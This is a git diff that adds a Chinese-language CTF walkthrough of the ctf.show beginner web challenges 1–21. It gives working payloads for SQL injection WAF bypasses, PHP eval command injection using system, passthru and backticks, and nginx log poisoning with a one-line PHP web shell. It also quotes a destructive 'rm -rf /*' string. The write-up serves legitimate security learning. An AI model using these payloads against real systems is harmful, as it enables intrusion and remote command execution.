@@ -480,3 +480,492 @@ if __name__ == "__main__":
 ![image](assets/image-20260603184828-erazb8k.png)
 
 base64解码后得到flag：`flag{战神归来发现自己儿子在刷题，一怒之下召唤10万将士来报仇}`
+## web1
+
+这是一道php代码审计题
+
+```php
+ <html>
+<head>
+    <title>ctf.show萌新计划web1</title>
+    <meta charset="utf-8">
+</head>
+<body>
+<?php
+# 包含数据库连接文件
+include("config.php");
+# 判断get提交的参数id是否存在
+if(isset($_GET['id'])){
+    $id = $_GET['id'];
+    # 判断id的值是否大于999
+    if(intval($id) > 999){
+        # id 大于 999 直接退出并返回错误
+        die("id error");
+    }else{
+        # id 小于 999 拼接sql语句
+        $sql = "select * from article where id = $id order by id limit 1 ";
+        echo "执行的sql为：$sql<br>";
+        # 执行sql 语句
+        $result = $conn->query($sql);
+        # 判断有没有查询结果
+        if ($result->num_rows > 0) {
+            # 如果有结果，获取结果对象的值$row
+            while($row = $result->fetch_assoc()) {
+                echo "id: " . $row["id"]. " - title: " . $row["title"]. " <br><hr>" . $row["content"]. "<br>";
+            }
+        }
+        # 关闭数据库连接
+        $conn->close();
+    }
+    
+}else{
+    highlight_file(__FILE__);
+}
+
+?>
+</body>
+<!-- flag in id = 1000 -->
+</html> 
+```
+
+题面已经帮我们做好了注释，告诉我们，要读取get参数，键是id,有个严重的限制，这里的id键值不能超过999，但是最下面的注释告诉我们，flag在id=1000，怎么绕过呢？
+
+回顾下这里的id参数处理`intval($id) > 999`​，它真的只允许id是整数嘛？答案是否，这里套了一个`intval`​方法，`intval()`​ 处理字符串时，会**从左到右读取，直到遇到第一个非数字字符**，然后返回已读取的整数部分。所以说啊，`id=999`​与`id=999.9`​这两个参数在intval眼里是一样的，都是999，但是参数的本质上不同了，按照php代码逻辑，完成大小判断后，会将id的值完整替换到sql查询语句中`select * from article where id = $id order by id limit 1`，注意，是id完整的值，包括符号什么的哦
+
+考虑下，怎么做才能查询到id=1000呢？末尾有个限制，`order by id limit 1`，只让输出一条，有了，我们可以使用联合查询
+
+使用的前提是前一个id=999应该为空，否则就打不通，哦，我们可以让id变成999.9,就算数据库的表中真的有999条记录，几乎不可能出现999.9吧
+
+好了已经满足联合查询的第一个条件了，让第一个查询为假，第二个查询的话，可以直接写`union select * from article where id=1000`，这代表查找article中id为1000的数据，由于存在union，这相当于或的意思，只会记录前后查询中真正查到的值，拼接结果如下:
+
+​`select * from article where id = 999! union select * from article where id=1000 order by id limit 1`
+
+常规情况下的联合注入会将所有查出来的数据输出，但是本题存在`order by id limit 1`，这会导致结果输出只能输出一条，因此我必须让第一个查询失败，所以我才找的999.9
+
+好了，本题的payload应该是：
+
+```php
+?id = 999.9 union select * from article where id=1000
+```
+
+![image](assets/image-20260603194044-700iz15.png)
+
+对应的url是：
+
+```plaintext
+https://1d3bc8e1-02bb-4b32-9135-d720a2738545.challenge.ctf.show/?id=999.9%20union%20select%20*%20from%20article%20where%20id=1000
+```
+
+okey，本题solve，答案是`ctfshow{b65414b7-ba99-44da-88b6-73126bc82bb3}`
+
+## web2
+
+本题相对上题加的防护只有这里
+
+![image](assets/image-20260604100136-v7dyrry.png)
+
+解释下，这里通过正则匹配，不限制大小写，查看id的键值里是否出现`or`​或`+`​，这两个关键字在sql注入会经常见到，`or`​是sql逻辑运算符，经常能在布尔盲注里见到，至于`+`​号的话，在url编码中，`+`​可以被解析成空格，所以说有的时候，如果题面正则匹配所有的空格，那么我们打注入空格可以用`+`替代，但是这里的限制和我用union打联合注入有什么关系呢？所以说啊，上一题的payload可以复用
+
+```plaintext
+https://55428a45-01f3-444c-b99e-ebc73517fba6.challenge.ctf.show/?id=999.9%20union%20select%20*%20from%20article%20where%20id=1000
+```
+
+![image](assets/image-20260604100037-n0mzota.png)
+
+## web3
+
+本次的waf很严格，看看正则部分
+
+![image](assets/image-20260604102243-qmpv2i9.png)
+
+这次正则过滤的模式有以下几种
+
+|模式|转义说明|匹配内容|拦截原因|
+| ------| ------------| ------------------------------| -------------------------|
+|​`or`|无|字符串 "or"（不区分大小写）|防止`or 1=1`等注入|
+|​`\-`|​`\`​转义`-`|连字符`-`|防止注释`--`、负数注入|
+|​`\\`|​`\`​转义`\`|反斜杠`\`本身|防止转义绕过、路径注入|
+|​`\*`|​`\`​转义`*`|星号`*`|防止`/* */`注释、通配符攻击|
+|​`\<`|​`\`​转义`<`|小于号`<`|防止 XSS (`<script>`)、SQL 比较|
+|​`\>`|​`\`​转义`>`|大于号`>`|防止 XSS、SQL 比较|
+|​`\!`|​`\`​转义`!`|感叹号`!`|防止`!=`​、`not`逻辑运算|
+|​`x`|无|字母 "x"（不区分大小写）|防止十六进制`0x...`​、`xml`等|
+|​`hex`|无|字符串 "hex"（不区分大小写）|防止`HEX()`函数转换注入|
+|​`\+`|​`\`​转义`+`|加号`+`|防止代替空格、算术运算|
+
+emm，看上去蛮严格的，但是这和我用url编码处理有啥关系？
+
+正则匹配一些关键字符，比如说`\*`一般是用于Linux命令中不让被解析成通配符，而得到的
+
+但是我用url编码，`%20*%20`​这里可没有在正则限制`\*`里啊
+
+因此，上面的payload依然可以复用
+
+```plaintext
+https://1549be5c-885a-4ef1-820d-cdeb0f19c458.challenge.ctf.show/?id=999.9%20union%20select%20*%20from%20article%20where%20id=1000
+```
+
+![image](assets/image-20260604102745-7n706sv.png)
+
+## web4
+
+![image](assets/image-20260604103151-wd9sesv.png)
+
+这次倒是需要正视下，相较上题，做了这样的改进
+
+|新增模式|含义|拦截原因|
+| ----------| ------------------| ----------------------------|
+|​`\/`|正斜杠`/`|防止路径注入、HTML闭合标签|
+|​`\(`|左括号`(`|防止函数调用、子查询|
+|​`\)`|右括号`)`|防止函数调用、子查询|
+|​`select`|SQL关键字 SELECT|**防止核心查询语句**|
+
+那么回忆下我的payload
+
+```plaintext
+?id = 999.9 union select * from article where id=1000
+```
+
+其它的都好绕过，但是核心`select`无法躲避，真的没有办法躲过限制嘛？
+
+在sql语句学习中，存在这个逻辑运算：`||`,它和union看上去很像，但是区别如下：
+
+|维度|​`\|\|` (逻辑或)|​`UNION` (联合查询)|
+| ------| ----------------------| ----------------------------|
+|**作用**|连接多个条件，筛选行|合并多个查询的结果集|
+|**操作对象**|行（WHERE子句中）|结果集（行）|
+|**返回结果**|满足任一条件的行|多个 SELECT 结果的上下拼接|
+|**列数要求**|无要求|**所有 SELECT 必须有相同列数** |
+
+所以说啊，我原本的payload其实还是弄得有点麻烦了，我有个非常妙的通杀版本
+
+```plaintext
+?id = 999.9 || id = 1000
+```
+
+这样的话，只要找到一个合法的，直接输出好了
+
+![image](assets/image-20260604104704-zhn62oe.png)
+
+## web5
+
+![image](assets/image-20260604105459-yvnpble.png)
+
+|新增模式|含义|拦截原因|
+| ----------| ----------| --------------------------|
+|​`\'`|单引号`'`|防止字符串注入、闭合引号|
+|​`\"`|双引号`"`|防止字符串注入、闭合引号|
+|​`\|`|竖线`\|`|**关键！** 阻止了`\|\|`逻辑或的使用|
+
+毁了，用`||`失败了
+
+考虑下mysql的运算符，这里[查表](https://www.runoob.com/mysql/mysql-operator.html)找没有被过滤的符号就好了，这里的取反有点说法
+
+![image](assets/image-20260604110258-zh3bp15.png)
+
+在mysql中，这个`~`​是按位取反的位运算符，举个例子，每个字节我们都能用二进制表示，比如说1010，如果我们使用`~1010`，结果就变成了0101
+
+那么这个和我们解题有什么帮助呢？还记得intvar方法嘛？它会从左往右读取键值，遇到符号就停止读取，但是！如果一开始就是符号，它会是默认值0，满足那个小于999的条件，因此我的payload如下：
+
+```plaintext
+?id=~~1000
+```
+
+进行一次取反，就变成其它数字了，再取反一次，不就变成1000了嘛？
+
+注意，我payload里的是十进制1000，举例子的时候，那里都是二进制，方便你直观看，要是真的对十进制1000取反，结果会变成负数
+
+![image](assets/image-20260604111445-n6m00r1.png)
+
+python和php的环境可能不太相同，但是我大致想表达的就是这样
+
+![image](assets/image-20260604111536-5hz36cw.png)
+
+## web6
+
+![image](assets/image-20260604112228-kig38e1.png)
+
+本次相对之前多过滤了一个位运算符`^`,它的作用是按位异或，就比如说二进制：10^11=01
+
+简单来说就是对应位上的二进制如果相同，就是0，不同就是1
+
+但是这和我们在web5里用的按位取反没有关系，上一题的payload继续复用
+
+![image](assets/image-20260604112209-kq97i13.png)
+
+## web7
+
+本关卡增加的限制是上一个题用到的取反符号`~`
+
+那么我们换个角度思考，前面尝试过的手段貌似都是想办法让id里面带有1000，我们用的都是十进制，那么php里的二进制怎么表示的呢？
+
+二进制的形式是0bxxxxxx,这个倒是和python的输出相似
+
+![image](assets/image-20260604135621-a9t1go0.png)
+
+那么我们使用0b1111101000好像能同时满足两个条件
+
+- intvar会认为它仅仅是0，小于999
+- php解析它的值，恰好是十进制1000，能锁定我们需要的flag对应的id
+
+那么本题的payload可以直接是
+
+```plaintext
+?id=0b1111101000
+```
+
+![image](assets/image-20260604135826-rl41tu9.png)
+
+## web8
+
+这题纯脑洞，很无聊，先看看题目提供的代码
+
+![image](assets/image-20260604140659-x9ygx0d.png)
+
+我来翻译下，这个index.php包含了config.php，它会读取来自GET请求的参数，键是flag，第一层判断是这个flag参数是否存在不为空，因此用isset
+
+第二层判断是这个参数的值是否于key参数的值一致，但是问题来了，我们并不知道key的键值是什么，它大概率是被config.php定义的，那么就目前情况，完全无解，看了别人的wp后，发现这里是出题人玩的梗
+
+![image](assets/image-20260604140929-g2mxpb9.png)
+
+删库跑路的话，相关的常用系统命令是`rm -rf /*`​,我就尝试着提交`?flag=rm -rf /*`,获取到了flag
+
+![image](assets/image-20260604141029-2zpuztx.png)
+
+## web9
+
+考察代码审计
+
+![image](assets/image-20260604141334-tzcc37v.png)
+
+会看到开始先加载config.php，里面一定存在flag的变量定义
+
+然后本php中会读取键名为c的GET请求，正则匹配的时候会不分大小写检测exec和system这两个系统命令，如果检测出来的话，会用eval执行GET请求的c的键值，否则会输出`cmd error`
+
+这里需要注意，eval确实有办法执行系统命令，但是它确切来说是用来执行php语句的，具体的可以看[菜鸟教程](https://www.runoob.com/php/func-misc-eval.html)
+
+![image](assets/image-20260604141848-iv6xtid.png)
+
+那么本题其实考察的是php语句和简单的函数调用，这里的白名单system和exec正好能轻松的执行Linux系统命令，具体自行前往菜鸟教程看细节
+
+我的payload是`?c=system("base64 config.php");`
+
+为啥不用`cat config.php`​呢？针对这类php web服务，能访问得到的，如果以`.php`为后缀，一定会被系统解析，这个时候我们只能看那种php执行中输出的内容(如果内置输出操作)，看不到完整的php代码，那么这个时候，使用系统自带的base64编码文件输出就好了（我解释的好像不太对，cat config.php也能打，在空白页面中查看源代码就能读取到原flag，奇怪，理论上，一旦被解析，我们是读不了这样没有输出能力的php文件
+
+![image](assets/image-20260604144555-0ak1zdx.png)
+
+![image](assets/image-20260604142915-go4af5o.png)
+
+得到flag内容：`ctfshow{7cc763e9-6d68-4284-85df-21fd213dcbba}`
+
+## web10
+
+![image](assets/image-20260604143200-dme49p9.png)
+
+上一题还是白名单，这一题就变成了黑名单，不过没啥问题，eval自身就有执行代码的能力，这次我们使用php内置的readfile函数即可
+
+```plaintext
+?c=readfile('config.php');
+```
+
+温馨提示，直接在网页端看不到是正常的，可以`ctrl+u`看源码
+
+![image](assets/image-20260604143820-49tvhce.png)
+
+## web11
+
+黑名单，相较上题，多ban了两个单词：highlight,cat
+
+![image](assets/image-20260604144857-2kf7m4s.png)
+
+但是我们上一题好像没有用过这两，那么上一题的payload复用
+
+![image](assets/image-20260604145046-vw3al1i.png)
+
+## web12
+
+这回有点狠,将关键的config和php给禁用了
+
+```php
+<?php
+# flag in config.php
+include("config.php");
+if(isset($_GET['c'])){
+        $c = $_GET['c'];
+        if(!preg_match("/system|exec|highlight|cat|\.|php|config/i",$c)){
+                eval($c);
+        }else{
+            die("cmd error");
+        }
+}else{
+        highlight_file(__FILE__);
+}
+?>
+```
+
+遇到这样的jail题，如果说不让明文写，我们就走编码，php内置了一个base64解码的函数`base64_decode("")`
+
+那么套用上一题的payload,将config.php进行base64编码不就可以了嘛？
+
+![image](assets/image-20260604183202-b2m3zum.png)
+
+```php
+?c=readfile('config.php');  #web11
+?c=readfile(base64_decode("Y29uZmlnLnBocA==")); #web12
+```
+
+![image](assets/image-20260604183323-1vs8vj9.png)
+
+## web13
+
+这次不允许出现file，那我前面的readfile可就寄了啊，得再找找其它的函数，能执行命令就行
+
+![image](assets/image-20260604183634-ch1ejvk.png)
+
+不赖，找到一个passthru()
+
+![image](assets/image-20260604184256-jy9myq5.png)
+
+那么本题就要改个方式了，大致写个这样的payload：`?c=passthru(base64_decode("Y2F0IGNvbmZpZy5waHA="));`
+
+我貌似有个地方没考虑到，本题还ban了分号，想办法绕过下
+
+我先随意写个最简单的php语句，它的作用是输出hello，有没有发现我在里面没有写分号？这是因为该语句是以`?>`​结尾的，在php中，语句之间是用分号分割的，到最后一条语句就不需要了，`?>`自带结尾结束的标志，因此就不用那个分号了
+
+```php
+<?php echo "hello" ?>
+```
+
+所以说啊，我可以让读取的c键值直接以?>结尾，这样就不会出现格式错误，正常执行了
+
+因此本题payload
+
+```php
+?c=passthru(base64_decode("Y2F0IGNvbmZpZy5waHA="))?>
+```
+
+![image](assets/image-20260604190735-pxpi7yx.png)
+
+## web14
+
+确实越来越难了，相对上题，本题将左括号给禁用了，那么貌似没办法再使用base64解码了？
+
+![image](assets/image-20260604191044-wseatwl.png)
+
+回想一下，既然系统会eval($c)，然后eval又只能执行php语句，那么我们让c再读取一个get参数d如何？至于那些被禁的函数功能，和我d有什么关系？
+
+> 想起来了鲁迅说的，你们抓的鲁迅，和我周树人有什么关系？哈哈哈
+
+那么这把应该这样处理
+
+```php
+?c=echo `$_GET[d]` ?>&d= cat config.php
+```
+
+![image](assets/image-20260604192100-cztxlpg.png)
+
+我来解释下，为哈要给那个`$_GET[d]`加上反引号，在php语法中，反引号可以直接当作shell_exec()函数，执行反引号内任意系统命令
+
+![image](assets/image-20260604192307-1c4uwef.png)
+
+倘若我们不加反引号，就无法解析那个d参数，最终得到的效果仅仅是echo d，将参数内容再输出一次而已
+
+## web15
+
+感觉这次蛮无解的，不过我们仔细观察，它这里居然没有再ban分号
+
+![image](assets/image-20260604192725-etwvylm.png)
+
+那么上一关的这个`` ?c=echo `$_GET[d]` ?>&d= cat config.php ``​改改用不就好了，既然把封闭符号`>`​给ban了，我们就把它替换会分号`;`，提交后发现成功了
+
+![image](assets/image-20260604192951-nxrunur.png)
+
+## web16
+
+这次的代码需要认真审计
+
+![image](assets/image-20260604193220-npm80gj.png)
+
+读取一个GET参数，键名是c，获取flag只有唯一一个要求，ctfshow+c的键值拼起来的md5哈希值是`a6f57ae38a22448c2f07f3f95f49c84e`
+
+这里还是强比较，我暂时没有想到可能的漏洞点
+
+![image](assets/image-20260604193434-orluq7i.png)
+
+使用somd5在线爆破网站成功解密哈希明文：ctfshow36d，那么我们应该给c的键值设置为36d，这样就能获取flag
+
+![image](assets/image-20260604193538-7psao4n.png)
+
+## web18
+
+![image](assets/image-20260604193922-l2zsc1m.png)
+
+考察文件包含？但是php和file伪协议貌似都打不了
+
+那么针对这题我们只能打日志文件包含，将一句话木马写入到某个请求的head中，发送请求后，日志文件一定会包含那个php一句话木马，接下来剩下最关键的一个步骤，必须以php文件格式来解析那个log文件，正好这里的include满足我们的需求，那么这把稳了，先写php代码吧，先用`phpinfo();`这个看上去会很显眼
+
+![image](assets/image-20260604194349-tiyrowc.png)
+
+然后点击execute发送这个添加了user-agent的包，回到页面，这次发送`?c=/var/log/nginx/access.log`
+
+![image](assets/image-20260604194517-fb0r9zb.png)
+
+成功看到phpinfo特有的紫色头，就知道这个打法没有问题，按照刚刚的方法，这次写个一句话木马`<?php system($_GET[1]); ?>`
+
+![image](assets/image-20260604194615-p87acgx.png)
+
+然后每次get请求的时候带上1，后面跟上Linux系统命令即可
+
+就比如说下面的`?c=/var/log/nginx/access.log&1=id`
+
+![image](assets/image-20260604194726-5xstll3.png)
+
+用ls可以看到当前路径存在文件36d.php，千万不要直接用cat 36d.php命令，因为当前页面可是会解析所有php语句的，我们可以将36d.php编码成base64,然后解码得到flag
+
+![image](assets/image-20260604194949-7ilkscs.png)
+
+![image](assets/image-20260604195014-xt1inuu.png)
+
+## web19
+
+![image](assets/image-20260604195229-a1sux7o.png)
+
+感觉和上一题差不多，都是打日志包含，就多ban了一个base,这完全可以payload复用
+
+先写马
+
+![image](assets/image-20260604195447-4391p8a.png)
+
+然后包含日志并执行命令
+
+![image](assets/image-20260604195532-tjpgokw.png)
+
+依旧base64编码处理
+
+![image](assets/image-20260604195628-jy5bkip.png)
+
+> 如果你想问，题目明明ban了base,为啥我还能用base64，那就说明你没有读懂代码，明明正则过滤的是参数c，和我的参数1有啥关系呢？
+
+解码后获取flag
+
+![image](assets/image-20260604195729-zuwpc9n.png)
+
+## web20
+
+原来还有不少其它的方法嘛？我打日志包含好像通杀
+
+![image](assets/image-20260604195939-ca4cy9q.png)
+
+![image](assets/image-20260604200030-d3t9nyq.png)
+
+![image](assets/image-20260604200037-lixwwoy.png)
+
+做法一样，后面就不多说了
+
+## web21
+
+emm，依旧通杀
+
+![image](assets/image-20260604200248-bob4g9u.png)
+
+![image](assets/image-20260604200339-qmqv5p2.png)
